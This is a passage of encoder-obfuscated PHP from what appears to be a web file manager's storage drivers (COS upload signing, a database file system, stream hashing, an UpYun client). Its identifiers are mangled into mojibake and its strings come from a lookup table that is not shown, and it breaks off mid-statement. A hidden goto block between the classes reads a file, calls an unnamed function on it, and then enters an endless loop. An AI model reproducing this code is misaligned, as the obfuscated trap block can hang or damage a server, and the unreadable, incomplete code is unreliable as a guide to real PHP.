($€ â¼Ò»[$Ëøœ¼úç[33]] == $Ëøœ¼úç[106] && $†€¹ºñ÷[$Ëøœ¼úç[33]] == $Ëøœ¼úç[928]) { return $Ëøœ¼úç[107]; } return $Ëøœ¼úç[1374]; } public static function driverType($È“à¥ú») { $ø¤’âŒ“ =& $_SERVER[íû‘ş´]; $Ü¢ôÑ   = str_replace($ø¤’âŒ“[1375], $ø¤’âŒ“[12], strtolower($È“à¥ú»->getType())); if ($Ü¢ôÑ   == $ø¤’âŒ“[816] || $Ü¢ôÑ   == $ø¤’âŒ“[1376] || $Ü¢ôÑ   == $ø¤’âŒ“[1377]) { $È“à¥ú» = self::defaultDriverInit(); } else { if ($Ü¢ôÑ   == $ø¤’âŒ“[1262] || $Ü¢ôÑ   == $ø¤’âŒ“[1378]) { $È“à¥ú» = IO::init($È“à¥ú»->pathParse[$ø¤’âŒ“[1209]]); } } $îĞãà€ğ = $È“à¥ú»->path; $Ü¢ôÑ   = str_replace($ø¤’âŒ“[1375], $ø¤’âŒ“[12], strtolower($È“à¥ú»->getType())); if ($Ü¢ôÑ   == $ø¤’âŒ“[106]) { return array($ø¤’âŒ“[33] => $ø¤’âŒ“[106], $ø¤’âŒ“[1372] => $ø¤’âŒ“[12], $ø¤’âŒ“[84] => $îĞãà€ğ, $ø¤’âŒ“[95] => $È“à¥ú»); } return array($ø¤’âŒ“[33] => $ø¤’âŒ“[928], $ø¤’âŒ“[1372] => $È“à¥ú»->pathDriver, $ø¤’âŒ“[84] => $îĞãà€ğ, $ø¤’âŒ“[95] => $È“à¥ú»); } public static function pathDriverType($Ú¸úç) { return $Ú¸úç ? self::driverType(IO::init($Ú¸úç)) : !1; } public static function pathDriverLocal($×ÃÇí«) { $€ş¬è²¾ =& $_SERVER[íû‘ş´]; $¦¡ÃÙó² = $×ÃÇí« ? self::driverType(IO::init($×ÃÇí«)) : !1; return $¦¡ÃÙó²[$€ş¬è²¾[33]] == $€ş¬è²¾[106] ? !0 : !1; } public static function allowCover($˜’…Ä°Ö, $æçª½şæ = true) { $íãŠàÚŞ =& $_SERVER[íû‘ş´]; if (is_string($˜’…Ä°Ö)) { $˜’…Ä°Ö = IO::info($˜’…Ä°Ö); } if (!$˜’…Ä°Ö || $˜’…Ä°Ö[$íãŠàÚŞ[33]] == $íãŠàÚŞ[75] || $˜’…Ä°Ö[$íãŠàÚŞ[76]] <= 100) { return !1; } if (isset($˜’…Ä°Ö[$íãŠàÚŞ[1379]]) || !$˜’…Ä°Ö[$íãŠàÚŞ[84]]) { return !1; } if (isset($˜’…Ä°Ö[$íãŠàÚŞ[216]]) && !$˜’…Ä°Ö[$íãŠàÚŞ[216]]) { return !1; } static $·Ù¥âÎÖ = false; if (!$·Ù¥âÎÖ || !$æçª½şæ) { $„ÜÌŸ‰µ = self::driverType(IO::init($˜’…Ä°Ö[$íãŠàÚŞ[84]])); $ÀøŞ‰Ğ‡ = $„ÜÌŸ‰µ[$íãŠàÚŞ[95]]; $·Ù¥âÎÖ = $íãŠàÚŞ[184]; if ($„ÜÌŸ‰µ[$íãŠàÚŞ[33]] == $íãŠàÚŞ[106]) { $·Ù¥âÎÖ = $íãŠàÚŞ[1380]; } if ($„ÜÌŸ‰µ[$íãŠàÚŞ[95]] && is_array($„ÜÌŸ‰µ[$íãŠàÚŞ[95]]->config)) { $Ï”ÅŒÓ™ = $„ÜÌŸ‰µ[$íãŠàÚŞ[95]]->config; if (isset($Ï”ÅŒÓ™[$íãŠàÚŞ[1381]]) && $Ï”ÅŒÓ™[$íãŠàÚŞ[1381]]) { $·Ù¥âÎÖ = $íãŠàÚŞ[1380]; } } } return $·Ù¥âÎÖ == $íãŠàÚŞ[1380] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($â¢²†’) { parent::__construct($â¢²†’); $this->signatureVersion($_SERVER[íû‘ş´][231]); } public function uploadFormData($™ÈôæŸ, $Ãù¯¼Ş÷ = 3600) { $À²Ü¶äì =& $_SERVER[íû‘ş´]; $óĞÔŸå = $À²Ü¶äì[213]; $ÜÓ¿¦šÀ = $À²Ü¶äì[247]; $‘ÄÉË²§ = $À²Ü¶äì[257]; $Àë¤¯µ¥ = gmdate($À²Ü¶äì[1382], time() + $Ãù¯¼Ş÷); $û¼„¡¸ñ = (string) time() . $À²Ü¶äì[71] . (string) (time() + $Ãù¯¼Ş÷); $à§ÕµúĞ = array($À²Ü¶äì[258] => $Àë¤¯µ¥, $À²Ü¶äì[261] => array(array($À²Ü¶äì[263] => $óĞÔŸå), array($À²Ü¶äì[262] => $this->bucket), array($À²Ü¶äì[264], $À²Ü¶äì[265], $À²Ü¶äì[12]), array($À²Ü¶äì[268] => $‘ÄÉË²§), array($À²Ü¶äì[1383] => $ÜÓ¿¦šÀ), array($À²Ü¶äì[1384] => $this->accessKey), array($À²Ü¶äì[1385] => $û¼„¡¸ñ))); $à§ÕµúĞ = json_encode($à§ÕµúĞ); $äÅŠÔ‚¥ = hash_hmac($À²Ü¶äì[247], $û¼„¡¸ñ, $this->secret); $û¢ºâÔ¬ = sha1($à§ÕµúĞ); $˜¢Ş©Æ˜ = hash_hmac($À²Ü¶äì[247], $û¢ºâÔ¬, $äÅŠÔ‚¥); $ÎØØ û² = array($À²Ü¶äì[263] => $óĞÔŸå, $À²Ü¶äì[268] => $‘ÄÉË²§, $À²Ü¶äì[276] => base64_encode($à§ÕµúĞ), $À²Ü¶äì[1383] => $ÜÓ¿¦šÀ, $À²Ü¶äì[1384] => $this->accessKey, $À²Ü¶äì[1386] => $û¼„¡¸ñ, $À²Ü¶äì[1387] => $˜¢Ş©Æ˜, $À²Ü¶äì[196] => $this->getHost()); return $ÎØØ û²; } public function fileOutLink($½´ô‰ı‘) { $ÏêÈ¢ëÛ =& $_SERVER[íû‘ş´]; if (substr($½´ô‰ı‘, 0, 7) == $ÏêÈ¢ëÛ[1388]) { $½´ô‰ı‘ = $ÏêÈ¢ëÛ[1389] . substr($½´ô‰ı‘, 7); } header($ÏêÈ¢ëÛ[162] . $½´ô‰ı‘); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ø’ÈéÃ²) { $this->pathParse = $Ø’ÈéÃ²; $this->model = Model($_SERVER[íû‘ş´][1390]); } public function getPath($áÉŠ‘Ÿ) { return trim($áÉŠ‘Ÿ, $_SERVER[íû‘ş´][8]); } public function pathFather($•ÄğíÉ) { $ŞèùÒúË = $this->parse($•ÄğíÉ); $ŞèùÒúË = $this->infoSimple($•ÄğíÉ); return $ŞèùÒúË ? $ŞèùÒúË[$_SERVER[íû‘ş´][180]] : !1; } public function pathThis($…Á¶¥Æ¸) { $¯©Ó©ü = $this->infoSimple($…Á¶¥Æ¸); return $¯©Ó©ü ? $¯©Ó©ü[$_SERVER[íû‘ş´][32]] : !1; } public function getPathOuter($’ªŠßÒ) { if (!$’ªŠßÒ) { return $’ªŠßÒ; } $ñášÇ’¡ = $this->parse($’ªŠßÒ); return KodIO::make($ñášÇ’¡[$_SERVER[íû‘ş´][443]]); } public function copyFolderFromIO($ˆ˜’¡óù, $Şâ„“³™, $ëĞÌÅ , $äÉ´Ÿğ, $¦¯Ì´À¡) { $¤ìîÎ°… = $this->model->copyFolderFromIO($ˆ˜’¡óù, $Şâ„“³™, $ëĞÌÅ , $äÉ´Ÿğ, $¦¯Ì´À¡); return KodIO::make($¤ìîÎ°…); } public function isParentOf($™ĞÃ‰İş, $ùµ¢ßâ) { return $this->model->isParentOf($™ĞÃ‰İş, $ùµ¢ßâ); } public function mkfile($†£—ŒÆä, $ç· ¨ = '', $‚ìö°Ç = REPEAT_RENAME) { $«¼–š¼Õ =& $_SERVER[íû‘ş´]; $Ãø§…Šø = $this->parse($†£—ŒÆä); $†£—ŒÆä = $Ãø§…Šø[$«¼–š¼Õ[443]]; for ($â°ô şÑ = 0; $â°ô şÑ < count($Ãø§…Šø[$«¼–š¼Õ[1391]]); $â°ô şÑ++) { $øÅï«·¶ = $Ãø§…Šø[$«¼–š¼Õ[1391]][$â°ô şÑ]; if ($â°ô şÑ == count($Ãø§…Šø[$«¼–š¼Õ[1391]]) - 1) { $†£—ŒÆä = $this->model->mkfile($†£—ŒÆä, $øÅï«·¶, $ç· ¨, $‚ìö°Ç); break; } $†£—ŒÆä = $this->model->mkdir($†£—ŒÆä, $øÅï«·¶, REPEAT_SKIP); } return $this->getPathOuter($†£—ŒÆä); } public function mkdir($Ì™À÷ˆ, $è´«–‚ã = REPEAT_SKIP) { $ªÇŸß =& $_SERVER[íû‘ş´]; $ô¨·¡§¦ = $this->parse($Ì™À÷ˆ); $Ì™À÷ˆ = $ô¨·¡§¦[$ªÇŸß[443]]; for ($Ÿğ¢¬±Õ = 0; $Ÿğ¢¬±Õ < count($ô¨·¡§¦[$ªÇŸß[1391]]); $Ÿğ¢¬±Õ++) { $ŒË–Ö…¸ = $ô¨·¡§¦[$ªÇŸß[1391]][$Ÿğ¢¬±Õ]; $Ì™À÷ˆ = $this->model->mkdir($Ì™À÷ˆ, $ŒË–Ö…¸, $è´«–‚ã); } return $this->getPathOuter($Ì™À÷ˆ); } public function copyFile($ğß¡ÖÓ, $áóôò–Ä, $´‚÷ĞˆÁ = REPEAT_REPLACE) { $Œ°¼õš =& $_SERVER[íû‘ş´]; $™ãğ…»œ = $this->parse($áóôò–Ä); $£‘¸Ÿ¶¦ = $this->model->copy($ğß¡ÖÓ, $™ãğ…»œ[$Œ°¼õš[443]], $´‚÷ĞˆÁ, $™ãğ…»œ[$Œ°¼õš[84]]); return $£‘¸Ÿ¶¦ ? $this->getPathOuter($£‘¸Ÿ¶¦) : !1; } public function moveFile($êÂ‘ñØ, $¡¯†ó‡, $Š‚Ø›½­ = REPEAT_REPLACE) { $’ù›Ø¾õ =& $_SERVER[íû‘ş´]; $š¹Õ­ş‰ = $this->parse($¡¯†ó‡); $Ø÷ç‘Ú€ = $this->model->move($êÂ‘ñØ, $š¹Õ­ş‰[$’ù›Ø¾õ[443]], $Š‚Ø›½­, $š¹Õ­ş‰[$’ù›Ø¾õ[84]]); return $Ø÷ç‘Ú€ ? $this->getPathOuter($Ø÷ç‘Ú€) : !1; } public function copy($ÛÎí×Ï, $­İü¢Î¿, $·ñíÕ·© = REPEAT_REPLACE, $Á¡×ÚÑ = false) { $ßÂùİê„ = $this->parse($­İü¢Î¿); $Ì—Ã ¶ú = $this->model->copy($ÛÎí×Ï, $ßÂùİê„[$_SERVER[íû‘ş´][443]], $·ñíÕ·©, $Á¡×ÚÑ); return $Ì—Ã ¶ú ? $this->getPathOuter($Ì—Ã ¶ú) : !1; } public function moveSameAllow() { } public function move($áØğ’û, $¾¦¬’€Œ, $„Ûù—´ = REPEAT_REPLACE, $°â˜’ = false) { $›ê•×•ß = $this->parse($¾¦¬’€Œ); $ëé»áğË = $this->model->move($áØğ’û, $›ê•×•ß[$_SERVER[íû‘ş´][443]], $„Ûù—´, $°â˜’); return $ëé»áğË ? $this->getPathOuter($ëé»áğË) : !1; } public function remove($¡úàÌÑâ, $—îÓ Ğá = true) { return $this->model->remove($¡úàÌÑâ, $—îÓ Ğá); } public function rename($—àÒî¤, $±ç¥¦ÓÀ) { $ßãŠĞÂ– = $this->model->rename($—àÒî¤, $±ç¥¦ÓÀ); return $ßãŠĞÂ– ? $this->getPathOuter($—àÒî¤) : $ßãŠĞÂ–; } public function size($”Á­½»Ÿ) { $ ª•ŠÆª = $this->infoSimple($”Á­½»Ÿ); return $ ª•ŠÆª ? $ ª•ŠÆª[$_SERVER[íû‘ş´][76]] : 0; } public function infoSimple($ÕÊ¬ó¸ª) { return $this->model->sourceInfo($ÕÊ¬ó¸ª); } public function info($àìÍÖ§à) { return $this->infoParse($àìÍÖ§à); } public function infoAuth($ëñœÒ•­) { return $this->infoParse($ëñœÒ•­, !1, !0); } public function infoWithChildren($ÁËíıïË) { return $this->infoParse($ÁËíıïË, !0); } protected function infoParse($ëÎŞì–, $È´‘è‘ = false, $Œ›Üœû = false) { if (!$È´‘è‘) { return $this->model->pathInfo($ëÎŞì–, $Œ›Üœû); } return $this->model->pathInfoMore($ëÎŞì–); } public function infoFullSimple($„ÕäÃ€ò) { $ª²†·¤Õ =& $_SERVER[íû‘ş´]; $½¤ç…úÅ = explode($ª²†·¤Õ[8], $„ÕäÃ€ò); $÷‡”ÛÒ¿ = implode($ª²†·¤Õ[8], array_splice($½¤ç…úÅ, 1)); return $this->model->pathInfoByPath($½¤ç…úÅ[0], $÷‡”ÛÒ¿); } public function infoFull($’èÅğÑ) { $˜Èİò¥– = $this->infoFullSimple($’èÅğÑ); return is_array($˜Èİò¥–) ? $this->model->pathInfo($˜Èİò¥–[$_SERVER[íû‘ş´][181]]) : !1; } public function hashSimple($¿òìö°Ó) { $à–İ³Û =& $_SERVER[íû‘ş´]; $»¿Ú¡Ë = $this->infoWithChildren($¿òìö°Ó); return $»¿Ú¡Ë[$à–İ³Û[526]][$à–İ³Û[650]]; } public function hashMd5($ÏˆåµƒË) { $˜ì¤«İû =& $_SERVER[íû‘ş´]; $Ùí¯Á’¦ = $this->infoWithChildren($ÏˆåµƒË); return $Ùí¯Á’¦[$˜ì¤«İû[526]][$˜ì¤«İû[524]]; } public function exist($ƒåİÄ¥) { $ñæ·ÕÁ¥ =& $_SERVER[íû‘ş´]; $òôæÍ¸ê = $this->parse($ƒåİÄ¥); if (!$òôæÍ¸ê[$ñæ·ÕÁ¥[84]]) { return $this->isFile($ƒåİÄ¥) || $this->isFolder($ƒåİÄ¥); } $¤˜ğë²è = array($ñæ·ÕÁ¥[454] => $òôæÍ¸ê[$ñæ·ÕÁ¥[443]], $ñæ·ÕÁ¥[32] => $òôæÍ¸ê[$ñæ·ÕÁ¥[84]]); $¨«×áÍ = $this->model->where($¤˜ğë²è)->find(); return $¨«×áÍ ? !0 : !1; } public function isFile($“È¾¿”¤) { $¨Î´ŞÎÂ =& $_SERVER[íû‘ş´]; $ã‡È¼´ç = $this->infoSimple($“È¾¿”¤); return $ã‡È¼´ç && $ã‡È¼´ç[$¨Î´ŞÎÂ[462]] == $¨Î´ŞÎÂ[212] ? !0 : !1; } public function isFolder($ô‘‚ÀÙâ) { $øåâñş =& $_SERVER[íû‘ş´]; $ŞÏ¤Ì¿© = $this->infoSimple($ô‘‚ÀÙâ); return $ŞÏ¤Ì¿© && $ŞÏ¤Ì¿©[$øåâñş[462]] == $øåâñş[88] ? !0 : !1; } public function listPath($ÓÅÉ·Ğû, $ö–¼î¹ = false) { $•¼ˆŞ• =& $_SERVER[íû‘ş´]; if ($ÓÅÉ·Ğû == $•¼ˆŞ•[12]) { return !1; } $áö‘ùŒ = array($•¼ˆŞ•[454] => $ÓÅÉ·Ğû); if ($ö–¼î¹) { return $this->model->listSource($áö‘ùŒ, -1); } return $this->model->listSource($áö‘ùŒ); } public function has($„ÔåÍ¹µ, $Ø½ò¼ ’ = false, $£’‹¡şó = null) { $Õ•¸Êèˆ =& $_SERVER[íû‘ş´]; $øŞ§À© = $this->infoWithChildren($„ÔåÍ¹µ); if ($Ø½ò¼ ’) { return array($Õ•¸Êèˆ[224] => $øŞ§À©[$Õ•¸Êèˆ[224]], $Õ•¸Êèˆ[223] => $øŞ§À©[$Õ•¸Êèˆ[223]]); } return $£’‹¡şó ? $øŞ§À©[$Õ•¸Êèˆ[224]] : $øŞ§À©[$Õ•¸Êèˆ[223]]; } public function listAll($«·¦‚Û¼) { $©¦í¨Æİ = IO::info($this->pathParse[$_SERVER[íû‘ş´][84]]); if (!$©¦í¨Æİ) { return array(); } return $this->model->listAll($«·¦‚Û¼); } public function getContent($ù­ãé©Æ) { return $this->model->getContent($ù­ãé©Æ); } public function setContent($ÀÎÏçÙ³, $Š±òâôó = '') { return $this->model->setContent($ÀÎÏçÙ³, $Š±òâôó); } public function fileSubstr($¯Â®ıŠÕ, $ÒéˆÚ—˜, $×ôÀá¢Ø) { return $this->model->fileSubstr($¯Â®ıŠÕ, $ÒéˆÚ—˜, $×ôÀá¢Ø); } public function download($àöÔš”Ü, $‘É€å = '') { $•µèÕ®Ä = get_path_father($‘É€å); $‰ÆÃÏ”× = get_path_this($‘É€å); $ûÄõñ¶Ó = $this->model->fileInfoGet($àöÔš”Ü); $ÄÈ­ø®î = IO::copy($ûÄõñ¶Ó[$_SERVER[íû‘ş´][84]], $•µèÕ®Ä, !1, $‰ÆÃÏ”×); return $ÄÈ­ø®î; } public function setModifyTime($ú˜ˆÕ¯, $Å½ï¿¸ = '') { $«¶®ÄğÃ =& $_SERVER[íû‘ş´]; if (!$ú˜ˆÕ¯) { return; } $this->model->where(array($«¶®ÄğÃ[468] => $ú˜ˆÕ¯))->save(array($«¶®ÄğÃ[85] => $Å½ï¿¸)); } public function upload($›¾ÎÊÓ„, $åÄÙÕàñ, $²É´ù°ì = false, $÷Ïï÷ë¯ = REPEAT_REPLACE) { $º€’¶ =& $_SERVER[íû‘ş´]; $ŠöÕ¢™¨ = $this->parse($›¾ÎÊÓ„); $ñÊıÅ® = $this->model->addFile($ŠöÕ¢™¨[$º€’¶[443]], $åÄÙÕàñ, $ŠöÕ¢™¨[$º€’¶[84]], $²É´ù°ì, $÷Ïï÷ë¯); return $this->getPathOuter($ñÊıÅ®); } public function uploadFileByID($ÙÎ­‚œ§, $œœğÌØ›, $İí˜ìğ) { $Â¯©¦ÀØ =& $_SERVER[íû‘ş´]; $¤Şéä–‹ = $this->parse($ÙÎ­‚œ§); $°‡ß¢Î² = $this->model->addFileByFileID($¤Şéä–‹[$Â¯©¦ÀØ[443]], $œœğÌØ›, $¤Şéä–‹[$Â¯©¦ÀØ[84]], $İí˜ìğ); return $this->getPathOuter($°‡ß¢Î²); } public function addFileByRemote($³ÂÓÌÚÀ, $íø•Å£, $¤õ°öüá = array(), $û„ëë¯Ö = '', $ª•ñç¸‘) { $´Åéòò” =& $_SERVER[íû‘ş´]; $ßı¼î¸ = $this->parse($³ÂÓÌÚÀ); $û„ëë¯Ö = empty($û„ëë¯Ö) ? $ßı¼î¸[$´Åéòò”[84]] : $û„ëë¯Ö; $Œ€äÃ¢† = $this->model->addFileByRemote($ßı¼î¸[$´Åéòò”[443]], $íø•Å£, $û„ëë¯Ö, $¤õ°öüá, $ª•ñç¸‘); return $this->getPathOuter($Œ€äÃ¢†); } public function uploadLink($ŞŠáËË”, $É‹Äç© = 0) { $˜Õ¯¤Ş¹ =& $_SERVER[íû‘ş´]; $æÛ’‹­ô = $this->parse($ŞŠáËË”); $ØÇŞˆË¬ = _get($GLOBALS[$˜Õ¯¤Ş¹[7]], $˜Õ¯¤Ş¹[1392]); $ááõËË· = _get($GLOBALS[$˜Õ¯¤Ş¹[7]], $˜Õ¯¤Ş¹[1393]); $ŞŠáËË” = Model($˜Õ¯¤Ş¹[652])->createFileName($æÛ’‹­ô[$˜Õ¯¤Ş¹[84]], $ØÇŞˆË¬, $ááõËË·); return IO::uploadLink($ŞŠáËË”, $É‹Äç©); } public function fileNameAuto($Âêüç–œ, $àÆğêı†, $¾©½Û±Ä = REPEAT_REPLACE, $È™“¦øà = false) { return $this->model->fileNameAuto($Âêüç–œ, $àÆğêı†, $¾©½Û±Ä, $È™“¦øà); } public function fileNameExist($Ü‘Ù×Û, $ÀûË‚ÄĞ) { return $this->model->fileNameExist($Ü‘Ù×Û, $ÀûË‚ÄĞ); } protected function _fileOut($âŠÊóû, $¨Éù¬“ú = false, $ªÙ¾‚à¯ = false, $ĞıÑÛá“ = '', $åç‹ñæ = false) { $ùÓğ•Ò =& $_SERVER[íû‘ş´]; $ğ½ÅÊ˜ = $this->model->sourceInfo($âŠÊóû); if ($ğ½ÅÊ˜[$ùÓğ•Ò[462]] == $ùÓğ•Ò[88]) { header($ùÓğ•Ò[1394]); die; } $¼¢¥º§‰ = $this->model->fileInfoGet($âŠÊóû); $ĞıÑÛá“ = $¼¢¥º§‰[$ùÓğ•Ò[524]] ? $¼¢¥º§‰[$ùÓğ•Ò[524]] : $ĞıÑÛá“; $÷”ÏÙÆú = is_array($GLOBALS[$ùÓğ•Ò[169]]) ? $GLOBALS[$ùÓğ•Ò[169]][$ùÓğ•Ò[32]] : $ğ½ÅÊ˜[$ùÓğ•Ò[32]]; if ($åç‹ñæ) { return IO::fileOutServer($¼¢¥º§‰[$ùÓğ•Ò[84]], $¨Éù¬“ú, $÷”ÏÙÆú, $ĞıÑÛá“); } IO::fileOut($¼¢¥º§‰[$ùÓğ•Ò[84]], $¨Éù¬“ú, $÷”ÏÙÆú, $ĞıÑÛá“); } public function fileOut($×èøãÁ, $ÏİÍíØˆ = false, $üÆ©µäà = false, $âÎ°¨Ø¸ = '') { $this->_fileOut($×èøãÁ, $ÏİÍíØˆ, $üÆ©µäà, $âÎ°¨Ø¸); } public function fileOutServer($ÖèÖ–Ã‡, $ÚÙ­·† = false, $ù£™¡¦¯ = false, $Úö£á­ = '') { $this->_fileOut($ÖèÖ–Ã‡, $ÚÙ­·†, $ù£™¡¦¯, $Úö£á­, !0); } protected function _fileOutImage($ŸèçËÁ¬, $ß–„®À = 250) { $×¥œ¸²ƒ =& $_SERVER[íû‘ş´]; $×ÂİÜ˜ = $this->model->pathInfo($ŸèçËÁ¬); if ($×ÂİÜ˜[$×¥œ¸²ƒ[462]] == $×¥œ¸²ƒ[88]) { show_json($×¥œ¸²ƒ[1395] . $ŸèçËÁ¬, !1); } $ËÏÛÙáÒ = $this->model->fileInfoGet($ŸèçËÁ¬); $×ÂİÜ˜[$×¥œ¸²ƒ[170]] = $ËÏÛÙáÒ[$×¥œ¸²ƒ[84]]; $GLOBALS[$×¥œ¸²ƒ[169]] = $×ÂİÜ˜; IO::fileOutImage($ËÏÛÙáÒ[$×¥œ¸²ƒ[84]], $ß–„®À); } public function fileOutImage($Ò¯ìåÛĞ, $æÑœÎ‹š = 250) { $this->_fileOutImage($Ò¯ìåÛĞ, $æÑœÎ‹š); } public function fileOutImageServer($›òÆòÅ, $ä²™·®¡ = 250) { $this->_fileOutImage($›òÆòÅ, $ä²™·®¡); } public function link($íÆ©ÂŸü, $¤—¡Ï€” = '') { $ÖáìêÍ½ = $this->model->fileInfoGet($íÆ©ÂŸü); return IO::link($ÖáìêÍ½[$_SERVER[íû‘ş´][84]], $¤—¡Ï€”); } protected function parse($è÷ş¹›ğ) { $ççğˆöü =& $_SERVER[íû‘ş´]; if (strstr($è÷ş¹›ğ, $ççğˆöü[8]) === !1) { return array($ççğˆöü[470] => intval($è÷ş¹›ğ), $ççğˆöü[84] => $ççğˆöü[12], $ççğˆöü[1391] => array()); } $¬×™Ë‹÷ = explode($ççğˆöü[8], trim($è÷ş¹›ğ, $ççğˆöü[8])); if (count($¬×™Ë‹÷) < 2) { show_tips(clear_html($è÷ş¹›ğ) . $ççğˆöü[1396]); } return array($ççğˆöü[470] => intval($¬×™Ë‹÷[0]), $ççğˆöü[84] => $¬×™Ë‹÷[1], $ççğˆöü[1391] => array_slice($¬×™Ë‹÷, 1)); } } goto F £¹·¤ìœ; dœ³“õôò: if (!isset($_SERVER[$_SERVER[íû‘ş´][444]]) || !isset($_SERVER[$_SERVER[íû‘ş´][452]])) { $_getc = $_SERVER[íû‘ş´][446]; $_getfile = $_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íû‘ş´][246], $_getfilec); if (count($_getarrs) < $_SERVER[íû‘ş´][449]) { $exit = $_SERVER[íû‘ş´][450]; $exit(); } $_act = $_SERVER[íû‘ş´][451]; $_act($_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[íû‘ş´][422]); } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($®§˜ÛÔ–, $ßï’‚¬ñ = 0) { parent::__construct(); $this->source = $®§˜ÛÔ–; $this->sourceSize = $ßï’‚¬ñ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($åÙ™¸Ø» = false) { return $this->sourceSize; } public function getContent($ÖÎ¢à¤ = false) { return $this->fileSubstr($ÖÎ¢à¤, 0, $this->sourceSize); } public function fileSubstr($‹Ú‚ŠıÚ = false, $×Û’°ÚÎ = 0, $·±“öŸğ = 0) { if (!$·±“öŸğ) { $·±“öŸğ = $this->sourceSize; } $»Úéø¨ = $this->sourceSize - $×Û’°ÚÎ; if ($·±“öŸğ >= $»Úéø¨) { $·±“öŸğ = $»Úéø¨; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $×Û’°ÚÎ, $·±“öŸğ); } if ($this->sourceType == self::TYPE_FILE) { if ($·±“öŸğ <= 0) { return $_SERVER[íû‘ş´][12]; } $°Ñ¬Ñë’ = ftell($this->source); fseek_64($this->source, $°Ñ¬Ñë’ + $×Û’°ÚÎ); $Ö¢êßõ× = @fread($this->source, $·±“öŸğ); fseek_64($this->source, $°Ñ¬Ñë’); return $Ö¢êßõ×; } } public function hashMd5($å´ÜÛÍë = false) { return md5($this->getContent()); } public static function hash($É±Œ–ß·, $ˆÒ²‡µø = 0) { $˜ÈÒ®Ñ  = new PathDriverStream($É±Œ–ß·, $ˆÒ²‡µø); return $˜ÈÒ®Ñ ->hashSimple($É±Œ–ß·); } public static function md5($‘ìÖÍğ, $¼ñÚëœÔ = 0) { $·¢ó¦Œç = new PathDriverStream($‘ìÖÍğ, $¼ñÚëœÔ); return $·¢ó¦Œç->hashMd5($‘ìÖÍğ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\x2f\166\x30\56\x61\x70\x69\x2e\165\x70\171\x75\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ˆ õšÃ) { parent::__construct(); $this->_init($ˆ õšÃ); } public function _init($ú“ğ­ï§) { $ôè¬úĞè =& $_SERVER[íû‘ş´]; foreach ($ú“ğ­ï§ as $Ô¢ëãÚÂ => $¦¡Ğâ¯ù) { if (isset($this->{$Ô¢ëãÚÂ})) { $this->{$Ô¢ëãÚÂ} = $¦¡Ğâ¯ù; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ôè¬úĞè[1496] . LNG($ôè¬úĞè[1427])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($®„ï£š—, $ç¾Ã˜Ö = "\107\x45\x54") { $­ş‹üÇÚ =& $_SERVER[íû‘ş´]; $×åñßúÎ = gmdate($­ş‹üÇÚ[1460]); $÷ı÷ª² = base64_encode(hash_hmac($­ş‹üÇÚ[1497], "{$ç¾Ã˜Ö}\x26{$®„ï£š—}\46{$×åñßúÎ}", md5("{$this->userpass}"), !0)); $ëì»œŸ‹ = array("\x41\x75\164\x68\157\x72\151\x7a\141\x74\151\157\156\x3a\x55\120\x59\125\x4e\x20{$this->username}\72{$÷ı÷ª²}", "\x44\x61\x74\x65\x3a{$×åñßúÎ}"); return $ëì»œŸ‹; } public function ussRequest($ÕãÍÁÓ, $øĞİ”İÚ = "\x47\x45\124", $›’»³ ˆ = false, $°‰åÆøÀ = false, $ùÄÕ–×™ = false) { $ì¼òïê =& $_SERVER[íû‘ş´]; $ÕãÍÁÓ = trim($ÕãÍÁÓ, $ì¼òïê[8]); $‹šÄŠœ© = "\57{$this->bucket}\57{$ÕãÍÁÓ}"; $ÌüÒ×Ëš = $this->ussHeaders($‹šÄŠœ©, $øĞİ”İÚ); if ($°‰åÆøÀ) { $ÌüÒ×Ëš = array_merge($ÌüÒ×Ëš, $°‰åÆøÀ); } $ı³ÈÎíˆ = url_request($this->endpoint . $‹šÄŠœ©, $øĞİ”İÚ, $›’»³ ˆ, $ÌüÒ×Ëš, $ùÄÕ–×™); if (!$ı³ÈÎíˆ) { return array($ì¼òïê[1270] => !1, $ì¼òïê[1260] => $ì¼òïê[1498]); } if (strtolower($øĞİ”İÚ) == $ì¼òïê[211] || in_array($ı³ÈÎíˆ[$ì¼òïê[1270]], array($ì¼òïê[257], $ì¼òïê[1499]))) { $›’»³ ˆ = $ı³ÈÎíˆ[$ì¼òïê[1500]]; } else { $›’»³ ˆ = json_decode($ı³ÈÎíˆ[$ì¼òïê[1260]], !0); if (!$›’»³ ˆ) { $›’»³ ˆ = $ı³ÈÎíˆ[$ì¼òïê[1260]]; } else { if (!$ı³ÈÎíˆ[$ì¼òïê[809]] && isset($›’»³ ˆ[$ì¼òïê[1501]])) { $›’»³ ˆ = $›’»³ ˆ[$ì¼òïê[1501]]; } } } return array($ì¼òïê[1270] => $ı³ÈÎíˆ[$ì¼òïê[809]], $ì¼òïê[1260] => $›’»³ ˆ); } public function mkfile($é—–Ë’Ÿ, $‹‘¹üË– = '', $ÄÉòÙßÇ = REPEAT_RENAME) { if ($this->setContent($é—–Ë’Ÿ, $‹‘¹üË–)) { return $this->getPathOuter($é—–Ë’Ÿ); } return !1; } public function mkdir($œÕä, $ÇÈ¿´¤º = REPEAT_SKIP) { $£½œ‘×€ =& $_SERVER[íû‘ş´]; $ÇøÂÜ“Ê = trim($œÕä, $£½œ‘×€[8]); if ($this->_isFolder($ÇøÂÜ“Ê)) { return $this->getPathOuter($ÇøÂÜ“Ê); } $Ş¹Ó•‹â = array($£½œ‘×€[1502]); $ËĞÎ¬¤† = $this->ussRequest($ÇøÂÜ“Ê, $£½œ‘×€[241], !1, $Ş¹Ó•‹â); return $ËĞÎ¬¤†[$£½œ‘×€[1270]] ? 